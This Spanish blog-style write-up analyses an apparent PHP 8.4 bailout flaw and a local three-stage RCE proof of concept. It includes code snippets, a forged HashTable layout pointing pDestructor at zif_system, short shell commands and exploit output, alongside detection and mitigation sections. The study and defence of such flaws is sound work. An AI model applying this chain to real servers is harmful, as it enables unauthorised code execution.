# PHP2Shell: cuando el límite de memoria de PHP se convierte en RCE

**Análisis y PoC local de CVE-2026-109618 / CVE-2026-109619 en PHP 8.4**

> Un `memory_limit` de 8 MB no debería ejecutar comandos. En PHP 8.4.26, con
> la configuración adecuada, sí: el camino de bailout que se activa al agotar
> la memoria deja estado corrupto que una sesión puede serializar y convertir
> en una referencia falsa. A partir de ahí, `pDestructor` apunta a
> `zif_system` y el motor ejecuta el comando.

Este artículo documenta la reproducción completa en un laboratorio local, la
comparación con PHP 8.4.27 y las señales que permiten detectar el problema. La
flag del reto original está redactada; el laboratorio usa una flag sintética.

---

## TL;DR

| | |
| --- | --- |
| Vulnerabilidad | corrupción de estado en el camino de bailout de PHP |
| CVE | CVE-2026-109618, CVE-2026-109619 |
| Afecta | ramas 8.2/8.3/8.4/8.5 anteriores al parche |
| Corregido en | 8.2.35, 8.3.36, 8.4.27, 8.5.12 (22 oct 2026) |
| Impacto | ejecución remota de código en el contexto del worker |
| Vector | HTTP plano; no requiere autenticación ni endpoint especial |
| Condiciones | `mod_php`, prefork, `memory_limit` bajo, upload progress activo |
| Señal de detección | cookie `PHPSESSID` anormalmente grande (4096 B) en 8.4.26; 32 B en 8.4.27 |
| PoC | cadena de 3 etapas, comando máximo de 14 bytes |

La frase oficial del changelog de PHP es breve:

> Fixed GHSA-w8hw-w9fx-j79w, GHSA-6wmf-4rv5-p3rp (Avoid state corruption via
> bailout).

Esa es la pista central: no es una validación de entrada olvidada, sino el
estado del motor después de un bailout.

---

## 1. Contexto

PHP2Shell es el nombre con el que circuló una cadena de explotación para PHP
8.4.26 publicada por el investigador **9bie**. La cadena convierte un fallo del
motor en ejecución remota de código sobre Apache con `mod_php`, usando
únicamente peticiones HTTP.

El 22 de octubre de 2026, PHP publicó parches en varias ramas. El changelog de
8.4.27 incluye dos avisos de seguridad, `GHSA-w8hw-w9fx-j79w` y
`GHSA-6wmf-4rv5-p3rp`, asociados a CVE-2026-109618 y CVE-2026-109619. El mismo
fix aparece en 8.3.36, 8.2.35 y 8.5.12.

No es un fallo de una aplicación concreta. La página del laboratorio solo
devuelve:

```php
<?php echo "OK\n"; ?>
```

No hay parámetros, no hay base de datos, no hay subida de archivos en el
código. Todo ocurre en el motor y en el manejo de sesiones.

---

## 2. El laboratorio

Para reproducirlo sin depender de la plataforma del reto, el repositorio levanta
dos contenedores con las imágenes oficiales:

| Servicio | Imagen | Rol |
| --- | --- | --- |
| `vuln` | `php:8.4.26-apache` | vulnerable |
| `patched` | `php:8.4.27-apache` | control |

Ambos comparten la misma configuración:

```ini
display_errors = On
display_startup_errors = On
error_reporting = E_ALL

memory_limit = 8M
post_max_size = 64M
upload_max_filesize = 64M

session.save_path = "/tmp"
session.use_strict_mode = 0
session.use_cookies = 1
session.upload_progress.enabled = On
session.upload_progress.cleanup = On
```

Y un Apache prefork con un único worker:

```apache
KeepAlive Off

<IfModule mpm_prefork_module>
    StartServers           1
    MinSpareServers        1
    MaxSpareServers        1
    MaxRequestWorkers      1
    ServerLimit            1
    MaxConnectionsPerChild 0
</IfModule>
```

### Por qué importa cada pieza

- **`memory_limit=8M`**: el campo `big` de 12 MB fuerza el agotamiento de
  memoria y el bailout en un punto controlable. Sin un límite bajo, la cadena
  de referencia no aplica tal cual.
- **Un solo worker**: el heap que se grooma en una petición sigue vivo en la
  siguiente. Con varios workers, la petición B puede caer en otro proceso.
- **`session.use_strict_mode=0`**: permite IDs de sesión arbitrarios, incluidos
  valores que el motor no generaría.
- **`session.upload_progress.enabled=On`**: el buffer de progreso de subida es
  parte del estado que se corrompe y se reutiliza.
- **`display_errors=On`**: es parte de la configuración del reto. No es el
  mecanismo del leak, pero se mantiene para conservar la fidelidad.

El compose publica solo en `127.0.0.1`. El runner, además, rechaza targets
públicos salvo `--allow-public`. El laboratorio es local por diseño.

---

## 3. La idea

La cadena tiene tres objetivos:

1. **Filtrar la base del heap** de Zend MM.
2. **Filtrar la base de `libphp.so`**.
3. **Escribir una referencia falsa** cuyo destructor sea `zif_system`.

El primer objetivo se consigue con una cookie de sesión de 4096 bytes que
contiene punteros del heap. El segundo, con una cookie de 16 bytes cuyo
`pDestructor` apunta a `zval_ptr_dtor`. El tercero, con el buffer de *upload
progress* y un `HashTable` falso de 167 bytes.

La parte contraintuitiva es que el leak no sale por un error, un `var_dump` ni
un endpoint de depuración: sale por `Set-Cookie`, en respuesta a un POST
multipart normal.

---

## 4. Etapa 0: rotar el worker

Antes de groomear, el exploit se asegura de tener un proceso limpio. Envía una
petición de ~15 MB con 1001 campos, un archivo y un campo `big` de 12 MB. El
límite de 8 MB se supera y el worker muere en el bailout.

Después envía una petición pequeña que inicializa una sesión. El motor recorre
el heap corrupto y el hijo aborta. El padre prefork detecta la muerte y crea un
nuevo worker.

```
cliente ── POST grande (OOM) ──► worker muere
        ── POST pequeña ───────► sesión sobre heap corrupto, aborta
                                   │
                              prefork fork ──► worker limpio
```

Este paso se repite entre etapas. Es la razón por la que el laboratorio usa un
solo worker persistente y por la que el exploit duerme fracciones de segundo
entre peticiones: necesita que el padre haya reemplazado al hijo.

---

## 5. Etapa 1: leak del heap

El grooming usa 1001 campos `p0000…p1000` de un byte, más la sesión, un archivo
y el campo `big`. Luego, con la sesión `attacksessionid0001`, añade 841 campos
de 48 bytes (`stage1_n=841`) y un campo `1999` de 79 bytes.

Ese campo contiene un `zend_string` falso:

```python
forge = bytearray(b"A" * 79)
struct.pack_into("<Q", forge, 0x10, 0x1000)  # longitud falsa
forge[0x18] = ord("L")                       # primer byte de chars
```

PHP serializa el string en la cookie `PHPSESSID`. La respuesta lleva una cookie
URL-encoded de **4096 bytes** con punteros del heap.

El parser decodifica la cookie, recorre ventanas de 8 bytes y se queda con los
valores que parecen punteros de usuario:

```python
# Ventana clásica de 47 bits y ventana alta de paginación de 5 niveles.
WINDOWS = ((0x7F0000000000, 0x800000000000), (1 << 55, 1 << 56))

def is_user_pointer(v):
    return any(lo <= v < hi for lo, hi in WINDOWS)

for i in range(len(raw) - 8):
    v = int.from_bytes(raw[i:i + 8], "little")
    if is_user_pointer(v):
        counts[v & ~0x1FFFFF] += 1
```

El chunk de Zend MM está alineado a 2 MB, así que la moda de
`v & ~0x1FFFFF` es la base. Se exige que aparezca al menos 8 veces.

En el laboratorio:

```
STAGE1_COOKIE_BYTES=4096
chunk base = 0x7ffffc400000
```

La dirección cambia en cada ejecución por ASLR; la alineación y el tamaño de la
cookie no.

---

## 6. Etapa 2: leak de `libphp.so`

La segunda etapa coloca una página de 56 bytes que parece un `HashTable`. Para
ello envía 983 grupos `a0000[j]…a0982[j]`; cada grupo aporta un valor de 16
bytes, salvo el grupo 406, que aporta 16 valores (`stage2_t=406`,
`stage2_v=16`).

La cookie resultante tiene 16 bytes. Los bytes `[8:16]` son
`nNextFreeElement|pDestructor`, un puntero a `zval_ptr_dtor` dentro de
`libphp.so`.

La validación es deliberadamente estricta:

```python
p = int.from_bytes(raw[8:16], "little")
if not is_user_pointer(p):         # ventanas 47/56 bits
    return 0
if p & 0xFFF != dtor_offset & 0xFFF:
    return 0
base = p - dtor_offset
return base if base & 0xFFF == 0 else 0
```

`libphp.so` está alineado a 4 KB, no a 2 MB. Por eso la comprobación es de 4 KB.
El offset de `zval_ptr_dtor` se obtiene del propio binario, no se hardcodea:

```text
zif_system     0x465370
zval_ptr_dtor  0x65eb60
```

```
STAGE2_COOKIE_BYTES=16
libphp base = 0x7ffffe013000
```

Con las dos bases:

```
HTDATA = chunk + 0x690d8   = 0x7ffffc4690d8
ZIF    = libphp + 0x465370 = 0x7ffffe478370
```

`0x690d8` es el offset, relativo al chunk, del string vivo de 167 bytes que se
usará como carrier.

---

## 7. Etapa 3: la referencia falsa

Esta es la parte que convierte un leak en ejecución.

### 7.1 Preparar el estado

Se envía un POST con:

- `PHPSESSID` de 19 bytes `a`;
- `PHP_SESSION_UPLOAD_PROGRESS` de 3 bytes `p`;
- seis pads de 31/31 bytes;
- el archivo de 64 bytes y el campo `big` de 12 MB;
- una cabecera `Cookie: PHPSESSID=aaaa…` de 32 bytes.

La cookie válida mantiene `PS(id)` vivo y hace que `php_session_initialize`
deje `send_cookie=0`. Sin ella, la siguiente petición asignaría la cabecera
`Set-Cookie` en `R0+16` y sobrescribiría `val.type`.

### 7.2 El carrier de 15 bytes

La segunda petición usa un `zend_string` de 15 bytes que cae exactamente sobre
`PS(http_session_vars)`:

```python
carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
```

Conserva `gc` (rc=1, `IS_REFERENCE`), reescribe los 7 bytes bajos de
`val.value` con `htdata` y deja el byte alto en `0x00`, porque los punteros
canónicos `0x00007f…` tienen ese byte a cero.

Después se envían 15 campos de 167 bytes con el `HashTable` falso.

### 7.3 El `HashTable` falso

| Offset | Campo | Valor |
| --- | --- | --- |
| `0x00` | `gc` | rc=1, `IS_ARRAY` |
| `0x08` | flags / nTableMask | `0x10` / `0xFFFFFFF8` |
| `0x10` | `arData` | `htdata + 0x20` |
| `0x18` | nNumUsed / nNumOfElements | 1 / 1 |
| `0x20` | nTableSize / puntero | 8 / 0 |
| `0x28` | nNextFreeElement | 0 |
| `0x30` | **pDestructor** | **`zif_system`** |
| `0x40` | fake `execute_data` | … |
| `0x80` | fake `zend_string` | rc=1, `IS_STRING` |
| `0x90` | longitud | `len(cmd)` |
| `0x98` | chars | comando + NUL |

El fake `execute_data` está en `htdata+0x40`: `num_args=1`, `arg1` apunta a
`htdata+0x80` y su tipo es `IS_STRING` (6). Cuando el motor destruye la sesión,
invoca `pDestructor` con ese `execute_data`; `zif_system` lee el argumento y
ejecuta el comando.

```
pDestructor(htdata+0x40)
  └─ zif_system("id>/out/p1")
       └─ /out/p1 = "uid=33(www-data) ..."
```

### 7.4 El límite de 14 bytes

El carrier tiene 167 bytes: `0x98` de cabecera, el comando y un NUL. El comando
máximo es de **14 bytes**:

```
id>/out/p1        (10)
cat /f>/out/p1    (14)
```

Para comandos más largos, la referencia usa un stager:

```
sh</out/c         (8)
```

donde `/out/c` es un script previamente colocado. Este PoC no implementa el
mecanismo de colocación; se limita a comandos de hasta 14 bytes. El límite es
una propiedad del payload, no del bug.

---

## 8. Ejecución real

Con el laboratorio levantado:

```sh
make lab-up-patched
make exploit
```

Salida:

```text
[*] target: http://127.0.0.1:8088/index.php (127.0.0.1:8088 [loopback])
[*] profile: bookworm php=8.4.26 zif=0x465370 dtor=0x65eb60 htdata=0x690d8 ...
[*] rotating worker over HTTP
[*] stage 1: heap leak (attempt 1/3)
[+] chunk base = 0x7ffffc400000
[*] rotating worker over HTTP
[*] stage 2: libphp leak (attempt 1/3)
[+] libphp base = 0x7ffffe013000
[*] rotating worker over HTTP
[*] stage 3: HTDATA=0x7ffffc4690d8 ZIF=0x7ffffe478370
[+] RCE on stage 3 attempt 1
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

La flag sintética se lee con el comando de 14 bytes:

```sh
make exploit CMD='cat /f>/out/p1'
```

```text
PROOF: FLAG{php2shell_lab_synthetic_flag_redacted}
```

La flag real del reto de THM se omite. En el repositorio, `/f` se monta desde
`runtime/f`, que está ignorado por git y contiene una flag sintética.

---

## 9. El parche

Contra PHP 8.4.27, con los offsets extraídos de su propio `libphp.so`
(`zif=0x46ad70`, `dtor=0x66a620`), la cadena se detiene en la primera etapa:

```text
[patched] [*] profile: bookworm php=8.4.26 zif=0x46ad70 dtor=0x66a620 ...
[patched] [*] stage 1: heap leak (attempt 1/3)
[patched] [-] heap leak missed
...
[-] patched: BLOCKED at stage0 after 3 attempts (4.4s): HEAP_LEAK_FAILED
[=] verdict: PATCHED_CONTROL_OK
```

La cookie de la etapa 1 mide **32 bytes**, no 4096. El leak desaparece y no se
llega a la etapa 2.

| Target | PHP | Cookie etapa 1 | Leak | RCE |
| --- | --- | --- | --- | --- |
| vulnerable | 8.4.26 | 4096 B | sí | sí |
| parcheado | 8.4.27 | 32 B | no | no |

El changelog describe el fix como “Avoid state corruption via bailout”. Nuestra
observación es consistente: el bailout de 8.4.26 deja un `zend_string` falso
serializable en la cookie; 8.4.27 ya no lo hace.

### Una advertencia metodológica

El control demuestra que **el primitivo de leak está bloqueado**, no
necesariamente que la etapa 3 esté bloqueada de forma independiente. Para
demostrar eso habría que recalibrar el grooming de 8.4.27 y llegar a la etapa 3
con un leak válido; el parche lo impide en la práctica. Es una distinción
importante si se quiere atribuir el fallo a un cambio concreto del motor.

---

## 10. Detección

### 10.1 Banner

La vía pasiva es la cabecera `X-Powered-By`:

```text
$ python3 -m poc detect -u http://127.0.0.1:8088/index.php
powered:   PHP/8.4.26
version:   8.4.26
verdict:   vulnerable
```

El umbral depende de la rama:

| Rama | Vulnerable | Parcheada |
| --- | --- | --- |
| 8.5 | < 8.5.12 | ≥ 8.5.12 |
| 8.4 | < 8.4.27 | ≥ 8.4.27 |
| 8.3 | < 8.3.36 | ≥ 8.3.36 |
| 8.2 | < 8.2.35 | ≥ 8.2.35 |

Si `expose_php=Off`, el banner no aparece y la detección pasiva no alcanza.

### 10.2 Probe conductual

La señal fuerte es el tamaño de la cookie de la etapa 1. El comando `detect
--probe` ejecuta solo esa etapa y combina el banner con el resultado:

```json
{
  "version": "8.4.26",
  "verdict": "vulnerable",
  "probe": {
    "success": true,
    "stage1_cookie_len": 4096,
    "chunk_base": "0x7ffffc400000"
  }
}
```

```json
{
  "version": "8.4.27",
  "verdict": "patched",
  "probe": {
    "success": false,
    "stage1_cookie_len": 32,
    "chunk_base": ""
  }
}
```

Un umbral práctico: cookies `PHPSESSID` de más de 1 KB en este flujo son
anómalas. No es una firma universal —otras aplicaciones pueden usar cookies
grandes— pero combinada con la versión y el endpoint de upload progress es una
señal útil.

### 10.3 Matriz reproducible

`make matrix` ejecuta la cadena completa contra ambos targets, extrae los
offsets de cada contenedor y guarda un JSON con el perfil, el fingerprint y los
resultados. El veredicto `PATCHED_CONTROL_OK` exige que el vulnerable tenga
proof y el parcheado no.

---

## 11. Mitigación

1. **Parchear**. Es la única mitigación completa. Actualiza a 8.4.27, 8.3.36,
   8.2.35 o 8.5.12 según la rama.
2. **Desactivar upload progress si no se usa**:
   `session.upload_progress.enabled=Off` reduce la superficie de esta cadena.
3. **Revisar límites de memoria y errores**: un `memory_limit` muy bajo y
   `display_errors=On` son parte del entorno del reto. En producción,
   `display_errors=Off` y límites realistas son la norma; no son una defensa
   completa, pero reducen el efecto del bailout.
4. **Endurecer sesiones**: `session.use_strict_mode=1` y IDs generados por el
   motor. No detiene la cadena por sí solo, pero elimina IDs arbitrarios.
5. **No confiar en el número de workers como defensa**. Un solo worker hace la
   cadena más fiable; varios workers no son una frontera de seguridad.
6. **WAF**: puede complicar payloads concretos, pero no corrige la corrupción
   de estado. No lo trates como reemplazo del parche.

---

## 12. Lecciones

- Los caminos de error y los bailouts son superficie de ataque. Un
  `memory_limit` no es solo una protección contra el consumo excesivo: también
  define dónde y cómo se limpia el estado.
- El parseo de sesiones y cookies es código del motor expuesto a HTTP plano.
- Un leak puede viajar en una cabecera `Set-Cookie` perfectamente válida; no
  hace falta un endpoint de debug.
- La detección por banner es útil pero insuficiente. La diferencia 4096 vs 32
  bytes es la evidencia conductual.
- Un control parcheado con offsets extraídos del propio binario es más fuerte
  que uno que solo cambia la versión y reutiliza offsets del vulnerable.

---

## 13. Reproducibilidad

Requisitos: Docker Engine/Desktop con el plugin Compose v2 y Python 3.9+.
En Linux x86_64 funciona de forma nativa; en Linux arm64 hace falta
binfmt/QEMU para `linux/amd64`:

```sh
docker run --privileged --rm tonistiigi/binfmt --install amd64
```

En macOS arm64, Docker Desktop incluye la emulación. En Fedora/RHEL con
SELinux enforcing, los bind mounts pueden necesitar `:z`.

El laboratorio de este artículo se ejecutó en macOS arm64 con Docker Desktop.
En un host Linux no se ha probado todavía; los puntos anteriores son los
requisitos que hay que cubrir.

```sh
git clone <repo>
cd scesiPoC-php2shell
make lab-up-patched
make doctor
make leak
make exploit
make exploit CMD='cat /f>/out/p1'
make detect
python3 -m poc detect --probe -u http://127.0.0.1:8088/index.php
make matrix
make lab-down
```

La suite tiene 72 tests y no necesita Docker:

```sh
make check
```

El repositorio incluye:

```
docker/       compose, ini, Apache, entrypoint, index.php
poc/          cliente HTTP, offsets ELF, perfiles, etapas, CLI, detección
profiles/     bookworm.json, lab.json
tests/        72 tests stdlib
docs/         laboratorio, arquitectura, etapas, resultados, este blog
runtime/      flag sintética y proofs (ignorado)
results/      matrices JSON (ignorado)
```

---

## 14. Ética y divulgación

Todo el trabajo se hizo contra contenedores locales levantados por el propio
repositorio, en `127.0.0.1`. No se interactuó con sistemas de terceros. La flag
del reto original se redacta en todo el material público; el laboratorio usa
`FLAG{php2shell_lab_synthetic_flag_redacted}`.

Si encuentras una instancia afectada fuera de un laboratorio, no la pruebes sin
autorización. La vía correcta es reportarla al propietario y actualizar PHP.

---

## 15. Referencias

- PHP 8 ChangeLog, 8.4.27 (22 oct 2026):
  <https://www.php.net/ChangeLog-8.php#8.4.27>
- Aviso de seguridad de PHP (octubre 2026):
  <https://www.php.net/archive/2026.php#2026-10-21-5>
- `GHSA-w8hw-w9fx-j79w` → CVE-2026-109618
- `GHSA-6wmf-4rv5-p3rp` → CVE-2026-109619
- Investigación y cadena de referencia de 9bie:
  <https://github.com/9bie/php2shell-bypass-aslr-exp>
- Imágenes oficiales de PHP para Docker:
  <https://github.com/docker-library/php>

---

*Artículo y PoC realizados en un laboratorio autorizado. El código se publica
con fines educativos y de defensa; úsalo solo en sistemas que controles.*
